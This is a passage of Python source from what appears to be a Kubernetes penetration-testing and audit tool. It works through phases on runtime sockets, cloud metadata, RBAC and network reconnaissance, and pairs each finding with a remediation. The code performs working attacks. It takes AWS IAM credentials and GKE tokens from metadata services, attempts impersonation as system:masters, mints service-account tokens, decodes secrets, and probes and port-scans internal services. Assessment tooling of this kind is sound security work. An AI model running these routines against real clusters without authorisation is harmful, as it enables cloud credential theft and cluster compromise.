    section("Container Runtime Socket")
    for sock in ["/var/run/docker.sock","/run/containerd/containerd.sock",
                 "/host/run/containerd/containerd.sock","/run/crio/crio.sock"]:
        if os.path.exists(sock):
            finding("CRITICAL",f"Runtime socket exposed: {sock}",
                    "Create privileged containers, exec into any pod, list all workloads",
                    "Never mount runtime sockets into application pods")
            add_attack_edge("Compromised Pod","Node Root",f"Docker/containerd via {sock}","CRITICAL")
            break
    else:
        finding("PASS","No runtime socket exposed","")

    section("Container Runtime Type")
    runtime = "unknown"
    # Check host-mounted sockets first (most reliable)
    if os.path.exists("/host/run/containerd/containerd.sock"): runtime = "containerd"
    elif os.path.exists("/run/containerd/containerd.sock"):    runtime = "containerd"
    elif os.path.exists("/var/run/docker.sock"):               runtime = "docker"
    elif os.path.exists("/run/crio/crio.sock"):                runtime = "cri-o"
    else:
        # Check cgroup for runtime hints
        cgroup = file_read("/proc/1/cgroup") or ""
        if "docker"      in cgroup: runtime = "docker"
        elif "containerd" in cgroup: runtime = "containerd"
        elif "crio"       in cgroup: runtime = "cri-o"
        # Check /proc/self/cgroup as well
        if runtime == "unknown":
            cgroup2 = file_read("/proc/self/cgroup") or ""
            if "containerd" in cgroup2: runtime = "containerd"
            elif "docker"   in cgroup2: runtime = "docker"
        # Check host kubelet config for runtime endpoint
        if runtime == "unknown":
            kube_cfg = file_read("/host/var/lib/kubelet/config.yaml") or ""
            if "containerd" in kube_cfg: runtime = "containerd"
            elif "docker"   in kube_cfg: runtime = "docker"
            elif "crio"     in kube_cfg: runtime = "cri-o"
        # kubectl describe node as last resort
        if runtime == "unknown" and CTX.get("kubectl"):
            _, rt_out, _ = run_cmd(
                "kubectl get nodes -o jsonpath='{.items[0].status.nodeInfo.containerRuntimeVersion}'",
                timeout=5)
            if rt_out:
                runtime = rt_out.strip().strip("'").split("://")[0]
    # Check for gVisor/Kata
    _, uname_out, _ = run_cmd("uname -r")
    if "gvisor" in uname_out.lower() or "runsc" in uname_out.lower():
        runtime = "gVisor (sandbox — escape harder)"
        finding("PASS","gVisor/Kata sandbox detected — container escape significantly harder","")
    else:
        finding("INFO",f"Container runtime: {runtime}","Escape feasibility depends on runtime")
    CTX["runtime"] = runtime

# ══════════════════════════════════════════════════════════════════
# PHASE 2: CLOUD METADATA & IAM
# ══════════════════════════════════════════════════════════════════
def phase_cloud_metadata():
    global CURRENT_PHASE
    CURRENT_PHASE = "2"
    phase_header("2","Cloud Metadata & IAM Credentials",
                 "IMDS credential theft, GKE metadata, OAuth token exfiltration")

    cloud = CTX.get("cloud","Unknown")

    if cloud == "AWS":
        section("AWS IMDSv1")
        code, body = http_get("http://169.254.169.254/latest/meta-data/", timeout=3)
        if code == 200:
            finding("CRITICAL","IMDSv1 accessible — no auth required",
                    "Any process can steal IAM creds without a session token",
                    "Set HttpTokens=required (IMDSv2 only) on all EC2 instances")
            add_attack_edge("Compromised Pod","AWS IAM Role","IMDSv1 → no-auth credential theft","CRITICAL")
        else:
            finding("PASS","IMDSv1 blocked","IMDSv2 required")

        section("AWS IMDSv2 Credential Theft")
        imds_token = ""
        try:
            req = urllib.request.Request(
                "http://169.254.169.254/latest/api/token", data=b"",
                headers={"X-aws-ec2-metadata-token-ttl-seconds":"21600","User-Agent":_get_ua()},
                method="PUT")
            with urllib.request.urlopen(req, timeout=3) as r:
                imds_token = r.read().decode().strip()
        except: pass

        if imds_token:
            code, role_body = http_get("http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                                       headers={"X-aws-ec2-metadata-token": imds_token}, timeout=3)
            role_name = role_body.strip() if code == 200 else ""
            if role_name:
                code2, creds_body = http_get(
                    f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}",
                    headers={"X-aws-ec2-metadata-token": imds_token}, timeout=3)
                try:
                    creds = json.loads(creds_body)
                    kid   = creds.get("AccessKeyId","")[:16]+"..."
                    exp   = creds.get("Expiration","unknown")
                    finding("CRITICAL","AWS IAM credentials stolen via IMDSv2",
                            f"Role: {role_name} | KeyId: {kid} | Expires: {exp}\n"
                            f"export AWS_ACCESS_KEY_ID={creds.get('AccessKeyId','')} "
                            f"AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...",
                            "Block 169.254.169.254/32 via NetworkPolicy")
                    add_attack_edge("AWS IAM Role","Cloud Account Compromise",
                                    f"Role {role_name} → aws sts get-caller-identity","CRITICAL")
                    CTX["aws_creds"] = creds
                except:
                    finding("HIGH","IMDS reachable, role found but parse failed",f"Role: {role_name}")

                code3, iid = http_get(
                    "http://169.254.169.254/latest/dynamic/instance-identity/document",
                    headers={"X-aws-ec2-metadata-token": imds_token}, timeout=3)
                try:
                    d = json.loads(iid)
                    CTX["aws_account"] = d.get("accountId","")
                    CTX["aws_region"]  = d.get("region","")
                    info_line(f"Account: {d.get('accountId')} | Region: {d.get('region')} | Instance: {d.get('instanceId')}")
                except: pass
            else:
                finding("MEDIUM","IMDSv2 reachable but no IAM role attached","")
        else:
            finding("PASS","IMDS not reachable","NetworkPolicy blocking 169.254.169.254")

        section("AWS IRSA")
        role_arn   = os.environ.get("AWS_ROLE_ARN","")
        token_file = os.environ.get("AWS_WEB_IDENTITY_TOKEN_FILE","")
        if role_arn and token_file:
            tok_content = file_read(token_file)
            if tok_content:
                jwt = decode_jwt(tok_content.strip())
                finding("HIGH","IRSA token present — pod-level AWS IAM access",
                        f"Role ARN: {role_arn}\n"
                        f"SA: {jwt.get('kubernetes.io/serviceaccount/service-account.name','?')}\n"
                        "aws sts assume-role-with-web-identity --role-arn ...",
                        "Scope IRSA role policy to minimum required permissions")
                add_attack_edge("Compromised Pod","AWS IAM Role",f"IRSA token → {role_arn}","HIGH")
        else:
            finding("PASS","No IRSA token","AWS_ROLE_ARN not set")

    elif cloud == "GKE":
        section("GKE Metadata Server")
        code, body = http_get(
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            headers={"Metadata-Flavor":"Google"}, timeout=3)
        if code == 200:
            try:
                tok = json.loads(body)
                finding("CRITICAL","GKE OAuth2 token via metadata server",
                        f"Type: {tok.get('token_type')} | Expires: {tok.get('expires_in')}s",
                        "Enable Workload Identity | disable node SA for pods")
                add_attack_edge("Compromised Pod","GCP Account","GKE metadata OAuth token","CRITICAL")
            except:
                finding("HIGH","GKE metadata accessible, token parse failed","")
        else:
            finding("PASS","GKE metadata token not accessible",f"HTTP {code}")

        section("GKE Node SA Scopes")
        code, scopes_body = http_get(
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes",
            headers={"Metadata-Flavor":"Google"}, timeout=3)
        if code == 200:
            scopes   = scopes_body.strip().split("\n")
            dangerous = [s for s in scopes if "cloud-platform" in s or "devstorage.read_write" in s]
            if dangerous:
                finding("CRITICAL","Dangerous GCP scopes on node SA",
                        f"Scopes: {', '.join(dangerous[:3])}\ncloud-platform = full GCP API access",
                        "Use Workload Identity instead of node SA scopes")
            else:
                finding("MEDIUM","GKE node has GCP scopes (limited)",
                        f"Scopes: {', '.join(scopes[:3])}",
                        "Consider Workload Identity")

        section("GKE Legacy Metadata")
        code, _ = http_get(
            "http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token",
            timeout=3)
        if code == 200:
            finding("CRITICAL","Legacy GKE metadata accessible without Metadata-Flavor header",
                    "Old GKE clusters expose tokens without auth header",
                    "Upgrade GKE cluster or enable metadata concealment")
        else:
            finding("PASS","Legacy GKE endpoint blocked",f"HTTP {code}")

    else:
        finding("INFO",f"Cloud: {cloud} — IMDS checks skipped for this provider","")

# ══════════════════════════════════════════════════════════════════
# PHASE 3: RBAC & K8S API ENUMERATION
# ══════════════════════════════════════════════════════════════════
def phase_rbac():
    global CURRENT_PHASE
    CURRENT_PHASE = "3"
    phase_header("3","Kubernetes API Enumeration via RBAC",
                 "SA permissions, secret theft, impersonation, TokenRequest, bind/escalate verbs")

    ns = CTX.get("namespace","default")
    if not CTX.get("token"):
        finding("INFO","No SA token — RBAC checks skipped","")
        return

    section("Anonymous API Access")
    code, resp = http_get_noauth("/api/v1/namespaces")
    if code == 200:
        finding("CRITICAL","Anonymous API access enabled — no authentication required",
                "Any network-reachable entity can query the Kubernetes API",
                "Set --anonymous-auth=false on API server")
        add_attack_edge("Network Access","Kubernetes API","Anonymous auth → direct API access","CRITICAL")
    elif code == 403:
        finding("PASS","Anonymous access denied (403 Forbidden)","API reachable but auth enforced")
    else:
        finding("INFO",f"Anonymous API test: HTTP {code}","")

    section("Self-Subject Rules Review (All Namespaces)")
    wildcard = False
    all_rules = []
    nss_to_check = CTX.get("namespaces",[ns])
    if not nss_to_check: nss_to_check = [ns]

    code, resp = k8s_api(
        "/apis/authorization.k8s.io/v1/selfsubjectrulesreviews", method="POST",
        data={"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":ns}})
    if code == 200 and resp:
        rules = resp.get("status",{}).get("resourceRules",[])
        for rule in rules:
            vbs = rule.get("verbs",[]); res = rule.get("resources",[]); grps = rule.get("apiGroups",[])
            if "*" in vbs and "*" in res and "*" in grps:
                wildcard = True
                finding("CRITICAL","Wildcard RBAC — full cluster access via SA token",
                        f"apiGroups:[*] resources:[*] verbs:[*]",
                        "Apply least-privilege RBAC")
                add_attack_edge("SA Token","Cluster Admin","Wildcard RBAC binding","CRITICAL")
        if not wildcard:
            finding("INFO",f"SA has {len(rules)} RBAC rule(s)","Checking specific dangerous verbs...")
        all_rules = rules

    section("Dangerous Verb Detection")
    # bind / escalate / impersonate
    for rule in all_rules:
        vbs = rule.get("verbs",[])
        res = rule.get("resources",[])
        if "bind" in vbs:
            finding("CRITICAL","SA has 'bind' verb — can grant any role to any subject",
                    f"Resources: {res}\nCan bind cluster-admin to attacker SA",
                    "Remove bind verb from all non-cluster-admin roles")
            add_attack_edge("SA Token","Cluster Admin","bind verb → grant cluster-admin","CRITICAL")
        if "escalate" in vbs:
            finding("CRITICAL","SA has 'escalate' verb — can update roles to add new permissions",
                    f"Resources: {res}",
                    "Remove escalate verb")
            add_attack_edge("SA Token","Cluster Admin","escalate verb → self-grant permissions","CRITICAL")
        if "impersonate" in vbs:
            finding("CRITICAL","SA has 'impersonate' verb — can act as any user or group",
                    f"Resources: {res}\nTest: --as=system:admin --as-group=system:masters",
                    "Remove impersonate verb from SA")
            add_attack_edge("SA Token","Cluster Admin","impersonate → system:masters","CRITICAL")

    section("Impersonation Attack Test")
    # Try API call with impersonation headers
    t = CTX.get("token","")
    api = CTX.get("api","https://kubernetes.default")
    try:
        req = urllib.request.Request(
            api + "/api/v1/namespaces",
            headers={
                "Authorization": f"Bearer {t}",
                "Impersonate-User": "system:admin",
                "Impersonate-Group": "system:masters",
                "Accept": "application/json",
                "User-Agent": _get_ua(),
            })
        with urllib.request.urlopen(req, context=_ssl_ctx(), timeout=6) as r:
            if r.status == 200:
                finding("CRITICAL","Impersonation as system:admin ACCEPTED",
                        "Impersonate-User: system:admin | Impersonate-Group: system:masters\n"
                        "Full cluster-admin access via impersonation",
                        "Remove impersonate verb from SA RBAC role")
                add_attack_edge("SA Token","Cluster Admin","Impersonation accepted by API","CRITICAL")
    except urllib.error.HTTPError as e:
        if e.code == 403:
            finding("PASS","Impersonation rejected (403)","SA cannot impersonate system:admin")
    except: pass

    section("TokenRequest API Abuse")
    sa_name = CTX.get("sa_name","default")
    code, resp = k8s_api(
        f"/api/v1/namespaces/{ns}/serviceaccounts/{sa_name}/token",
        method="POST",
        data={"apiVersion":"authentication.k8s.io/v1","kind":"TokenRequest",
              "spec":{"audiences":["https://kubernetes.default.svc"],"expirationSeconds":3600}})
    if code == 201 and resp:
        new_tok = resp.get("status",{}).get("token","")
        finding("HIGH","TokenRequest API allowed — can generate fresh SA tokens indefinitely",
                f"Generated new token for {ns}/{sa_name} (expires in 1h)\n"
                "Even if original token is rotated, attacker can keep minting new ones",
                "Restrict 'create' verb on serviceaccounts/token")
        add_attack_edge("SA Token","Persistent Access","TokenRequest → infinite token generation","HIGH")
    else:
        finding("PASS","TokenRequest not permitted",f"HTTP {code}")

    section("Secret Access")
    checks = [
        ("ns_secrets",    f"/api/v1/namespaces/{ns}/secrets"),
        ("all_secrets",   "/api/v1/secrets"),
        ("namespaces",    "/api/v1/namespaces"),
        ("pods",          "/api/v1/pods"),
        ("configmaps",    f"/api/v1/namespaces/{ns}/configmaps"),
        ("services",      "/api/v1/services"),
        ("deployments",   f"/apis/apps/v1/namespaces/{ns}/deployments"),
        ("crbs",          "/apis/rbac.authorization.k8s.io/v1/clusterrolebindings"),
        ("events",        f"/api/v1/namespaces/{ns}/events"),
        ("nodes",         "/api/v1/nodes"),
    ]
    results = {}
    def _chk(n, p):
        code, resp = k8s_api(p, timeout=6); return n, code, resp
    with ThreadPoolExecutor(max_workers=8) as ex:
        for n, code, resp in ex.map(lambda x: _chk(*x), checks):
            results[n] = (code, resp)

    code_ns, resp_ns = results.get("ns_secrets",(0,None))
    code_all, resp_all = results.get("all_secrets",(0,None))

    if code_ns == 200 and resp_ns:
        items = resp_ns.get("items",[])
        names = [i["metadata"]["name"] for i in items]
        finding("CRITICAL",f"Can list secrets in '{ns}' ({len(items)} secrets)",
                f"Secrets: {', '.join(names[:8])}{'...' if len(names)>8 else ''}",
                "Set automountServiceAccountToken: false | Restrict SA permissions")
        add_attack_edge("SA Token","Namespace Secrets",f"list secrets in {ns}","CRITICAL")
        for item in items:
            sname = item["metadata"]["name"]
            if "default-token" not in sname:
                code_s, resp_s = k8s_api(f"/api/v1/namespaces/{ns}/secrets/{sname}")
                if code_s == 200 and resp_s:
                    data = resp_s.get("data",{})
                    decoded = {k: decode_b64(v)[:60] for k,v in list(data.items())[:4]}
                    finding("CRITICAL",f"Secret readable: {sname}",
                            "\n".join([f"{k}: {v}" for k,v in decoded.items()]),
                            "Restrict RBAC — remove get/list on secrets")
                break

    if code_all == 200 and resp_all:
        total = len(resp_all.get("items",[]))
        finding("CRITICAL",f"Cluster-wide secret access ({total} secrets across all namespaces)",
                "Can read every secret in every namespace",
                "Remove cluster-wide secret list/get from RBAC")
        add_attack_edge("SA Token","All Cluster Secrets","cluster-wide secret list","CRITICAL")

    section("Cluster Enumeration")
    code_nss, resp_nss = results.get("namespaces",(0,None))
    if code_nss == 200 and resp_nss:
        nss = [i["metadata"]["name"] for i in resp_nss.get("items",[])]
        finding("HIGH",f"Can list all namespaces ({len(nss)})",
                f"Namespaces: {', '.join(nss)}","Restrict cluster-level namespace list")
        CTX["namespaces"] = nss

    code_pods, resp_pods = results.get("pods",(0,None))
    if code_pods == 200 and resp_pods:
        pods = resp_pods.get("items",[])
        finding("HIGH",f"Can list all pods cluster-wide ({len(pods)})",
                f"Sample: {', '.join([p['metadata']['name'] for p in pods[:4]])}","Restrict pod list to own namespace")
        CTX["all_pods"] = pods

    code_nodes, resp_nodes = results.get("nodes",(0,None))
    if code_nodes == 200 and resp_nodes:
        nodes = resp_nodes.get("items",[])
        node_info = []
        for n in nodes:
            meta    = n.get("metadata",{})
            status  = n.get("status",{})
            info    = status.get("nodeInfo",{})
            addrs   = {a["type"]: a["address"] for a in status.get("addresses",[])}
            node_info.append({
                "name":        meta.get("name",""),
                "ip":          addrs.get("InternalIP",""),
                "external_ip": addrs.get("ExternalIP",""),
                "hostname":    addrs.get("Hostname",""),
                "os":          info.get("operatingSystem",""),
                "runtime":     info.get("containerRuntimeVersion",""),
                "kubelet":     info.get("kubeletVersion",""),
                "kernel":      info.get("kernelVersion",""),
            })
        finding("HIGH",f"Can enumerate all nodes ({len(nodes)})",
                "\n".join([f"{n['name']} | {n['ip']} | {n['runtime']} | kubelet {n['kubelet']}"
                           for n in node_info[:6]]),
                "Restrict node list permission")
        CTX["nodes"] = node_info
    else:
        finding("PASS","Cannot list nodes","")

    # Pod log access
    code_ev, resp_ev = results.get("events",(0,None))
    if code_ev == 200 and resp_ev:
        events  = resp_ev.get("items",[])
        cred_ev = [e for e in events if any(kw in str(e.get("message","")).lower()
                   for kw in ["password","secret","token","credential","failed mount","failedmount"])]
        if cred_ev:
            finding("HIGH",f"Event logs leak sensitive info ({len(cred_ev)} events with keywords)",
                    "\n".join([truncate(e.get("message",""),100) for e in cred_ev[:4]]),
                    "Restrict event read permissions | Sanitize application log messages")
        else:
            finding("INFO",f"Can read events ({len(events)} total)","No immediate credential leakage in events")

    section("Pod Exec & Log Permissions")
    for verb_resource, label in [("pods/exec","Exec into pods (lateral movement)"),
                                  ("pods/log","Read pod logs (credential leakage)")]:
        code_auth, resp_auth = k8s_api(
            "/apis/authorization.k8s.io/v1/selfsubjectaccessreviews", method="POST",
            data={"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview",
                  "spec":{"resourceAttributes":{"namespace":ns,"verb":"create","resource":verb_resource}}})
        if code_auth == 201 and resp_auth:
            allowed = resp_auth.get("status",{}).get("allowed",False)
            if allowed:
                finding("HIGH",f"SA can: {label}",
                        f"verb: create | resource: {verb_resource} | namespace: {ns}",
                        f"Remove {verb_resource} create from SA RBAC")
                add_attack_edge("SA Token","Other Pods",f"{verb_resource} → lateral movement","HIGH")

    section("cluster-admin Bindings")
    code_crbs, resp_crbs = results.get("crbs",(0,None))
    if code_crbs == 200 and resp_crbs:
        admin_subjects = []
        for crb in resp_crbs.get("items",[]):
            if crb.get("roleRef",{}).get("name") == "cluster-admin":
                for s in crb.get("subjects",[]):
                    admin_subjects.append(f"{s.get('kind')}: {s.get('namespace','cluster')}/{s.get('name')}")
        if admin_subjects:
            finding("HIGH",f"cluster-admin bound to {len(admin_subjects)} subject(s)",
                    "\n".join(admin_subjects[:6]),
                    "Audit and reduce cluster-admin bindings")

    section("ConfigMap Sensitive Data")
    code_cm, resp_cm = k8s_api(f"/api/v1/namespaces/{ns}/configmaps")
    if code_cm == 200 and resp_cm:
        for cm in resp_cm.get("items",[]):
            for k, v in (cm.get("data") or {}).items():
                if any(kw in k.lower() for kw in ["password","secret","key","token","credential"]):
                    finding("MEDIUM",f"Sensitive key in ConfigMap {cm['metadata']['name']}.{k}",
                            f"Value: {str(v)[:80]}",
                            "Use Kubernetes Secrets not ConfigMaps for credentials")

# ══════════════════════════════════════════════════════════════════
# PHASE 4: NETWORK RECON & LATERAL MOVEMENT
# ══════════════════════════════════════════════════════════════════
def phase_network(fast=False):
    global CURRENT_PHASE
    CURRENT_PHASE = "4"
    phase_header("4","Network Recon & Lateral Movement",
                 "Service discovery, DNS SRV, port scan, etcd, NodePort, NetworkPolicy, sniffing")

    section("Service Discovery via Env Vars")
    svc_env = {}
    for k, v in os.environ.items():
        if k.endswith("_SERVICE_HOST"):
            svc_name = k[:-len("_SERVICE_HOST")].lower().replace("_","-")
            port_key = k[:-len("_SERVICE_HOST")]+"_SERVICE_PORT"
            port = os.environ.get(port_key,"?")
            svc_env[svc_name] = (v, port)
    if svc_env:
        finding("INFO",f"Auto-injected {len(svc_env)} service endpoint(s)",
                "\n".join([f"{n}: {v}:{p}" for n,(v,p) in list(svc_env.items())[:8]]))
        CTX["known_services"] = svc_env

    section("NetworkPolicy Enumeration")
    code_np, resp_np = k8s_api("/apis/networking.k8s.io/v1/networkpolicies")
    if code_np == 200 and resp_np:
        policies = resp_np.get("items",[])
        if not policies:
            finding("HIGH","Zero NetworkPolicies exist cluster-wide",
                    "All pods can freely communicate with all other pods",
                    "Apply default-deny NetworkPolicy to all namespaces")
            add_attack_edge("Compromised Pod","Any Pod","No NetworkPolicy → unrestricted lateral movement","HIGH")
        else:
            nss_covered = set(p.get("metadata",{}).get("namespace","") for p in policies)
            finding("INFO",f"{len(policies)} NetworkPolicies across {len(nss_covered)} namespace(s)",
                    f"Namespaces with policies: {', '.join(list(nss_covered)[:8])}")
    else:
        finding("INFO",f"Cannot list NetworkPolicies (HTTP {code_np})","")

    section("NodePort & LoadBalancer Services")
    code_svc, resp_svc = k8s_api("/api/v1/services")
    if code_svc == 200 and resp_svc:
        external = []
        for svc in resp_svc.get("items",[]):
            stype = svc.get("spec",{}).get("type","")
            if stype in ("NodePort","LoadBalancer"):
                name = svc["metadata"]["name"]
                ns_s = svc["metadata"]["namespace"]
                ports = svc.get("spec",{}).get("ports",[])
                lbs   = [i.get("ip","") or i.get("hostname","")
                         for i in svc.get("status",{}).get("loadBalancer",{}).get("ingress",[])]
                external.append(f"{ns_s}/{name} ({stype}) ports:{ports} LB:{lbs}")
        if external:
            finding("MEDIUM",f"{len(external)} externally exposed service(s)",
                    "\n".join(external[:8]),
                    "Review NodePort/LoadBalancer services — apply NetworkPolicy egress rules")

    section("DNS Enumeration")
    dns_targets = [
        "payment-api","payment-api.payments","payments","billing","auth","api",
        "backend","database","db","redis","postgres","mysql","mongodb","vault",
        "consul","admin","internal","checkout","grafana","prometheus","kibana",
        "elasticsearch","rabbitmq","kafka","zookeeper","jenkins","gitlab","harbor",
    ]
    dns_found = {}
    if not fast:
        def _res(name):
            ip = dns_resolve(name); return name, ip
        with ThreadPoolExecutor(max_workers=20) as ex:
            for name, ip in ex.map(_res, dns_targets):
                if ip: dns_found[name] = ip
        if dns_found:
            finding("INFO",f"DNS resolved {len(dns_found)} internal service(s)",
                    "\n".join([f"{n} → {ip}" for n,ip in list(dns_found.items())[:10]]))
            CTX["dns_found"] = dns_found

        section("DNS SRV Records")
        srv_targets = [
            "_http._tcp.kubernetes.default.svc.cluster.local",
            "_https._tcp.kubernetes.default.svc.cluster.local",
        ]
        for n, ip in dns_found.items():
            srv_targets.append(f"_http._tcp.{n}.svc.cluster.local")
        srv_found = {}
        for srv in srv_targets[:10]:
            ips = dns_srv(srv)
            if ips: srv_found[srv] = ips
        if srv_found:
            finding("INFO",f"SRV records resolved: {len(srv_found)} hidden services",
                    "\n".join([f"{k} → {v}" for k,v in list(srv_found.items())[:5]]),
                    "Review SRV-exposed services for unintended exposure")

    section("Internal API Probe (Lateral Movement)")
    targets = []
    for name,(ip,port) in svc_env.items():
        targets.append((f"http://{ip}:{port}",name))
    for name,ip in (CTX.get("dns_found") or {}).items():
        for ep in ["/","/api/v1","/health","/metrics","/admin","/transactions","/customers"]:
            targets.append((f"http://{ip}:8080{ep}",f"{name}{ep}"))

    lateral_found = []
    def _probe(url_label):
        url, label = url_label
        code, body = http_get(url, timeout=3)
        return url, label, code, (body or "")[:400]
    if targets:
        with ThreadPoolExecutor(max_workers=10) as ex:
            for url, label, code, body in ex.map(_probe, targets[:25]):
                if code == 200: lateral_found.append((url, code, body))

    # Recursive endpoint walking — if a service advertises its own endpoints, probe them all
    extra_targets = []
    for url, code, body in lateral_found:
        try:
            resp_json = json.loads(body)
            # Common patterns: {"endpoints":["/health","/transactions"]}
            # or {"paths":[...]}, {"routes":[...]}, swagger/openapi
            advertised = []
            if isinstance(resp_json, dict):
                for key in ["endpoints","paths","routes","links","urls"]:
                    val = resp_json.get(key,[])
                    if isinstance(val, list):
                        advertised.extend([str(v) for v in val if str(v).startswith("/")])
                # Swagger/OpenAPI paths object
                if "paths" in resp_json and isinstance(resp_json["paths"], dict):
                    advertised.extend(list(resp_json["paths"].keys())[:20])
            base = url.rstrip("/").rsplit("/",1)[0] if "/" in url.split("//",1)[-1] else url
            # Use the root of the service
            parsed = url.split("//",1)
            if len(parsed) == 2:
                host_part = parsed[1].split("/")[0]
                base_url  = f"{parsed[0]}//{host_part}"
            else:
                base_url = url
            for ep in advertised[:15]:
                full = f"{base_url}{ep}"
                if full not in [t[0] for t in targets] and full not in [u for u,_,_ in lateral_found]:
                    extra_targets.append((full, f"advertised:{ep}"))
        except: pass

    if extra_targets:
        info_line(f"Recursively probing {len(extra_targets)} advertised endpoint(s)...")
        with ThreadPoolExecutor(max_workers=8) as ex:
            for url, label, code, body in ex.map(_probe, extra_targets[:20]):
                if code == 200:
                    lateral_found.append((url, code, body))

    if lateral_found:
        istio_active = "istio" in (CTX.get("runtime_tools") or [])
        for url, code, body in lateral_found:
            sensitive = any(kw in body.lower() for kw in
                            ["password","secret","token","card","email","customer",
                             "transaction","credit","ssn","dob","account"])
            finding("CRITICAL" if sensitive else "HIGH",
                    f"Internal service reachable: {url}",
                    f"HTTP {code} | {truncate(body,150)}" +
                    ("\n⚠ Sensitive keywords in response!" if sensitive else ""),
                    "Apply Istio mTLS + AuthorizationPolicy or NetworkPolicy")
            if sensitive:
                add_attack_edge("Compromised Pod","Internal Data",f"HTTP lateral → {url}","CRITICAL")
    else:
        istio_active = "istio" in (CTX.get("runtime_tools") or [])
        if istio_active:
            finding("PASS","No internal services reachable — Istio mTLS + AuthorizationPolicy enforced",
                    "All HTTP probes blocked\nIstio PeerAuthentication and AuthorizationPolicy active")
        else:
            finding("PASS","No unexpected internal services reachable",
                    "mTLS or NetworkPolicy restricting traffic")

    section("Port Scan — Internal Services")
    if not fast and CTX.get("dns_found"):
        ports   = [80,443,8080,8443,3000,3306,5432,6379,9200,27017,9092,2379,2380]
        open_p  = []
        def _scan(hp):
            h, p = hp
            return (h, p) if tcp_open(h, p, 1) else None
        scan_targets = [(ip, p) for _, ip in list(CTX["dns_found"].items())[:5] for p in ports]
        with ThreadPoolExecutor(max_workers=30) as ex:
            for r in ex.map(_scan, scan_targets):
                if r: open_p.append(r)
        if open_p:
            # Check if Istio is present — open TCP port does NOT mean HTTP accessible
            # Istio sidecars listen on all ports but AuthorizationPolicy may block HTTP
            istio_present = "istio" in (CTX.get("runtime_tools") or [])
            if istio_present:
                finding("INFO",f"Open TCP ports detected ({len(open_p)}) — Istio mTLS may restrict HTTP",
                        "\n".join([f"{h}:{p}" for h,p in open_p[:12]]) +
                        "\nIstio sidecar intercepts all traffic — verify AuthorizationPolicy blocks HTTP access",
                        "Verify with: kubectl get authorizationpolicies -A")
            else:
                finding("MEDIUM",f"Open ports on internal services: {len(open_p)}",
                        "\n".join([f"{h}:{p}" for h,p in open_p[:12]]),
                        "Apply NetworkPolicy or Istio AuthorizationPolicy to restrict inter-pod traffic")
            CTX["open_ports"] = open_p

    section("Service Mesh Detection")
    sidecar_found = []
    mesh_type     = ""

    # Method 1: sidecar containers in pod list (requires pod list permission)
    for pod in (CTX.get("all_pods") or []):
        for container in pod.get("spec",{}).get("containers",[]):
            n = container.get("name","").lower()
            if any(sm in n for sm in ["istio-proxy","linkerd-proxy","envoy","cilium-agent"]):
                sidecar_found.append(n)

    # Method 2: Check CTX["runtime_tools"] — populated by /apis discovery in Phase 12
    # This is the most reliable since /apis is readable by all authenticated SAs
    if "istio" in CTX.get("runtime_tools", []):
        mesh_type = "Istio"
    elif not mesh_type:
        # Method 3: Direct CRD probes as fallback
        mesh_crd_checks = [
            ("/apis/networking.istio.io/v1alpha3/peerauthentications",    "Istio"),
            ("/apis/networking.istio.io/v1beta1/peerauthentications",     "Istio"),
            ("/apis/security.istio.io/v1/authorizationpolicies",          "Istio"),
            ("/apis/security.istio.io/v1beta1/authorizationpolicies",     "Istio"),
            ("/apis/networking.istio.io/v1alpha3/virtualservices",        "Istio"),
            ("/apis/linkerd.io/v1alpha2/serviceprofiles",                  "Linkerd"),
        ]
        for path, mtype in mesh_crd_checks:
            code_m, _ = k8s_api(path, timeout=3)
            if code_m in (200, 403):
                mesh_type = mtype
                break

    if sidecar_found:
        finding("INFO","Service mesh sidecars detected in pod specs",
                f"Sidecars: {', '.join(set(sidecar_found)[:5])}\n"
                "Attack vectors: sidecar injection, mTLS bypass, policy misconfiguration",
                "Review mesh AuthorizationPolicies for wildcard rules")
    elif mesh_type:
        finding("INFO",f"{mesh_type} service mesh detected via CRDs",
                f"Mesh CRDs present — mTLS and AuthorizationPolicies may be active\n"
                f"This explains blocked lateral movement to payment-api",
                "Verify: kubectl get peerauthentication -A | kubectl get authorizationpolicies -A")
        CTX["runtime_tools"] = list(set(CTX.get("runtime_tools", []) + ["istio"]))
    else:
        finding("INFO","No service mesh detected","Pod-to-pod traffic likely unencrypted")

    # Enumerate Istio PeerAuthentications (mTLS policy scope)
    if mesh_type == "Istio" or "istio" in (CTX.get("runtime_tools") or []):
        for pa_path in ["/apis/security.istio.io/v1/peerauthentications",
                        "/apis/networking.istio.io/v1beta1/peerauthentications",
                        "/apis/networking.istio.io/v1alpha3/peerauthentications"]:
            code_pa, resp_pa = k8s_api(pa_path, timeout=4)
            if code_pa == 200 and resp_pa:
                pas = resp_pa.get("items",[])
                strict = [p for p in pas
                          if p.get("spec",{}).get("mtls",{}).get("mode") == "STRICT"]
                if strict:
                    finding("PASS",f"Istio PeerAuthentication STRICT mTLS: {len(strict)} policy/ies",
                            "\n".join([f"{p['metadata']['namespace']}/{p['metadata']['name']}"
                                        for p in strict[:5]]),)
                elif pas:
                    finding("MEDIUM","Istio PeerAuthentication present but not STRICT",
                            f"{len(pas)} policies — check for PERMISSIVE mode",
                            "Set mtls.mode: STRICT on all namespaces")
                break
            elif code_pa == 403:
                finding("INFO","Istio PeerAuthentication CRD present (cannot read — 403)","")
                break

    section("Network Sniffing Capability")
    try:
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
        s.close()
        finding("HIGH","NET_RAW — traffic sniffing possible via raw sockets",
                "Can capture plain-text HTTP traffic between pods",
                "Drop NET_RAW | Enable Istio mTLS")
    except PermissionError:
        finding("PASS","NET_RAW denied — sniffing not possible","")
    except Exception:
        finding("PASS","NET_RAW denied","")

# ══════════════════════════════════════════════════════════════════
# PHASE 5: CONTAINER ESCAPE
# ══════════════════════════════════════════════════════════════════
def phase_escape():
    global CURRENT_PHASE
    CURRENT_PHASE = "5"
    phase_header("5","Container Escape Vectors",
                 "nsenter, chroot, cgroup v1, core_pattern, user namespaces, runtime socket")

    cap_data = file_read("/proc/self/status") or ""
    cap_eff  = ""
    for line in cap_data.split("\n"):
        if line.startswith("CapEff:"): cap_eff = line.split()[1]; break
